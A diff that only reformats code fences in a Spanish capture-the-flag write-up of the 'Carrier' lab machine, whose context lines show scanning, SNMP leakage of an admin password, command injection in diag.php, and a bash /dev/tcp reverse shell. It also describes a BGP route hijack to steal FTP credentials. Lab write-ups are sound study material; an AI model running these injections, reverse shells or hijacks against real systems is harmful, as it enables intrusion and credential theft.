@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.105
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:21 CST
 Initiating Ping Scan at 11:21
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 113.54 seconds
 
 Corroboremos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.105
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 19:25:54 GMT
@@ -80,7 +80,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sS -Pn -sC -sV -p80,22 10.10.10.105 -n -v
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 13:35 CST
 NSE: Loaded 148 scripts for scanning.
@@ -142,7 +142,7 @@ Concluimos que tenemos un puerto HTTP con Apache 2.4.18 sobre Ubuntu (eso dice e
 
 Vamos a lanzar un amigable gobuster sobre el puerto TCP/80 de carrier:
 
-```text
+``` text
 xbytemx@laptop:~/tools$ ./gobuster -u 10.10.10.105 -w ~/git/payloads/owasp/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
 
 =====================================================
@@ -183,7 +183,7 @@ Tenemos varias respuestas interesantes, algunos directorios, un archivo index y 
 
 Ya que hemos sacado algunas carpetas y archivos, usemos `httpie` para ver que pasa por aca:
 
-```html
+``` html
 xbytemx@laptop:~/tools$ http 10.10.10.105/
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -265,7 +265,7 @@ Vary: Accept-Encoding
 
 Como podemos observar, tenemos una pantalla de login y unos códigos extraños en la parte superior:
 
-```html
+``` html
 <span class="badge badge-danger">Error 45007</span><br>
 <span class="badge badge-danger">Error 45009</span>
 ```
@@ -274,7 +274,7 @@ Tambien y no menos importante una cookie, lo cual nos indica que para la autenti
 
 Revisemos en la carpeta doc que nos pudo encontrar gobuster:
 
-```html
+``` html
 xbytemx@laptop:~/tools$ http 10.10.10.105/doc/
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -307,7 +307,7 @@ Vary: Accept-Encoding
 
 Descargamos los archivos de directorio DOC y encontramos que error\_codes y diagram\_for\_tac nos indican mas información sobre la maquina:
 
-```text
+``` text
 CW1000-X Lyghtspeed Management Platform v1.0.4d(Rel 1. GA)
 Error messages list
 
@@ -324,7 +324,7 @@ El diagrama nos indica que Zaza Telecom tiene el AS 200, CastCom tiene el AS 300
 
 Si, también me paso como otros que me confié de mis primeros resultados y llegue a un callejón sin salida. Gracias a un hit volví a lanzar el escaneo en UDP:
 
-```text
+``` text
 root@laptop:~# nmap -sU 10.10.10.105 -n -v --open -T4
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 10:37 CST
 Initiating Ping Scan at 10:37
@@ -374,7 +374,7 @@ Como podemos ver, nmap nos devuelve que el puerto UDP/161 se encuentra abierto y
 
 Realizamos un snmpwalk sobre el servidor con la comunidad public como target:
 
-```bash
+``` bash
 xbytemx@laptop:~$ snmpwalk -v1 -c public 10.10.10.105
 iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
 End of MIB
@@ -388,7 +388,7 @@ Excelente! ahora tenemos el numero de serie del equipo! Si recordamos la informa
 
 Usamos las credenciales que hemos obtenido para ingresar en la aplicación:
 
-```text
+``` text
 xbytemx@laptop:~$ http --form 10.10.10.105 username=admin password=NET_45JDX23
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -408,7 +408,7 @@ Nos redirige a la pagina de `/dashboard.php`, la cual si recordamos descubrimos 
 
 Veamos el contenido de  **diag.php**.
 
-```html
+``` html
 xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=cXVhZ2dh
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -490,7 +490,7 @@ Vary: Accept-Encoding
 
 Espera, a ese pokemon lo he visto antes. Así es, la salida de un `ps`. Esa variable check, suena sospechosa y también conocida, vemos si la podemos decodear:
 
-```text
+``` text
 xbytemx@laptop:~$ printf "cXVhZ2dh" | base64 -d
 quagga
 ```
@@ -499,7 +499,7 @@ quagga
 
 Así que el parámetro que recibía `diag.php` via POST fue `quagga`. Esto huele a command injection. Preparemos con sustitución algunas cosas:
 
-```html
+``` html
 xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=$(printf "quagga" | base64)
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -581,7 +581,7 @@ Vary: Accept-Encoding
 
 Logre ejecutar de manera exitosa el mismo comando controlando el output. Veamos si se puede concatenar comandos con `;`
 
-```text
+``` text
 xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=0pe9hk302pnup5s84e9984gd24; path=/" check=$(printf "quagga;ls" | base64)
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -672,7 +672,7 @@ Perfecto, al final aparece el ls del directorio $HOME del usuario.
 
 Levantemos un listener del lado de mi máquina:
 
-```text
+``` text
 xbytemx@laptop:~$ ncat -lnvp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -685,13 +685,13 @@ Ejecutemos una del arsenal para que el servidor se conecte a mi maquina y podamo
 
 Concatenamos y lanzamos:
 
-```text
+``` text
 xbytemx@laptop:~$ http --form http://10.10.10.105/diag.php "Cookie: PHPSESSID=ld7k5a627mvs32ge9246tn2857; path=/" check=$(printf "quagga;bash -i >& /dev/tcp/10.10.15.126/3001 0>&1" | base64)
 ```
 
 Esperamos que carrier se conecte hacia nosotros:
 
-```text
+``` text
 xbytemx@laptop:~$ ncat -lnvp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -708,7 +708,7 @@ uid=0(root) gid=0(root) groups=0(root)
 Listo ya estamos dentro. Ahora tomemos la flag de user.txt
 
 # `cat user.txt`
-```text
+``` text
 root@r1:~# cat user.txt
 ```
 
@@ -716,7 +716,7 @@ root@r1:~# cat user.txt
 
 Como muchos saben, conectarse a cada rato puede resultar algo aburrido de hacer una y otra vez, es por ello que realice el siguiente script en python para que me conecte cada que sea necesario. El único requerimiento es tener un ncat escuchando en el puerto 3001.
 
-```python
+``` python
 #! /usr/bin/python
 
 import requests,base64,netifaces
@@ -747,7 +747,7 @@ Los carriers o ISP interactúan usando BGP para compartir información sobre el 
 
 Si miramos la tabla de enrutamiento aprendido por BGP, usando vtysh veremos lo siguiente:
 
-```text
+``` text
 BGP table version is 0, local router ID is 10.255.255.1
 Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
               i internal, r RIB-failure, S Stale, R Removed
@@ -847,7 +847,7 @@ Con esto terminamos de cerrar algunos cabos; debemos replicar el route leak de l
 
 Necesitamos averiguar cual es la dirección del servidor IP, pero como es un contenedor muy limitado, no tenemos herramientas a primera mano a menos que hagamos un pequeño script o mejor aun, usemos uno de [commandlinefu](https://www.commandlinefu.com/commands/view/5298/ping-scanning-without-nmap):
 
-```text
+``` text
 root@r1:~# for i in {1..254}; do ping -c 1 -W 1 10.120.15.$i | grep 'from'; done
 <}; do ping -c 1 -W 1 10.120.15.$i | grep 'from'; done
 64 bytes from 10.120.15.10: icmp_seq=1 ttl=64 time=0.085 ms
@@ -861,7 +861,7 @@ Con esto hemos encontrado nuestro target, el servidor 10.120.15.10.
 
 Después de explorar y explorar sobre la maquina, intentar varias veces el route-leak y fallar o tardar mucho, me tope con este cronjob:
 
-```text
+``` text
 root@r1:~# cat /var/spool/cron/crontabs/root
 cat /var/spool/cron/crontabs/root
 # DO NOT EDIT THIS FILE - edit the master and reinstall.
@@ -906,7 +906,7 @@ Básicamente y a pesar de ser root, decidí no intervenir y trabajar con lo que 
 
 Cree un script para realizar la conexión lo mas rápido y eficiente posible:
 
-```bash
+``` bash
 #!/bin/bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export SHELL=bash && export TERM=xterm-256color
@@ -927,7 +927,7 @@ En otra terminal puse el listener del reverse shell para llamar al script de bas
 
 Veamos que ocurrió:
 
-```text
+``` text
 xbytemx@laptop:~$ ncat -lnvp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -1038,7 +1038,7 @@ root@as100:/dev/shm# cd /dev/shm/ && python3 ftp_server.py
 
 Excelente, ya tenemos el listener y el anuncio sobre BGP, esperemos a ver si engañamos a alguien:
 
-```text
+``` text
 2019-03-06 04-48-17 [-] Start ftp server: Enter q or Q to stop ftpServer...
 2019-03-06 04-48-17 [-] Server started: Listen on: 10.120.15.10, 21
 2019-03-06 04-49-01 [-] Accept: Created a new connection 10.78.10.2, 35248
@@ -1066,7 +1066,7 @@ Con eso logramos obtener las credenciales de root.
 
 Ahora, ¿cómo usamos esas credenciales? Fácil por ssh hacia el host intervenido (spoiler, borre la interface y ejecute restore.sh):
 
-```text
+``` text
 root@as100:~# export SHELL=bash && export TERM=xterm-256color
 root@as100:~# ssh root@10.120.15.10
 ssh root@10.120.15.10
@@ -1103,7 +1103,7 @@ root.txt  secretdata.txt
 
 # `cat root.txt`
 
-```text
+``` text
 root@carrier:~# cat root.txt
 cat root.txt
 ```
